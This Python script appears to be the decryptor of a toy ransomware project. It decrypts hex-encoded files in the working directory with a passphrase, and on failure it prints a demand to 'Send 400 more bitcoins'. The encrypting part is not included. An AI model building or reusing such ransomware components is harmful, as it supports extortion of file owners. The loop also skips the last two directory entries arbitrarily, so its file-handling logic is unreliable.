import os
import sys
from simplecrypt import decrypt, encrypt

file_path = os.getcwd()
passphrase = input("Enter Secure Password: ")
list_dir = os.listdir(file_path)
numb = len(list_dir) - 2
for i in range(int(numb)):
    if(list_dir[i] != "test_ransomware.py" and list_dir[i] != "decryption_key.py"):
        print("Hang Tight! Processing Decryption")
        file_p = os.path.basename(list_dir[i])
        file_op = open(file_p, 'r')
        file_text = file_op.read()
        file_bytes = bytes.fromhex(file_text)
        try:
            file_data_decrypt = decrypt(str(passphrase), file_bytes)
            file_decode = file_data_decrypt.decode('utf-8')
            file_wr = open(list_dir[i], 'w')
            file_wr.write(file_decode)
            print("Decryption Done! Check the files.")
        except Exception:
                print("Wrong decryption key! Send 400 more bitcoins")   
                sys.exit()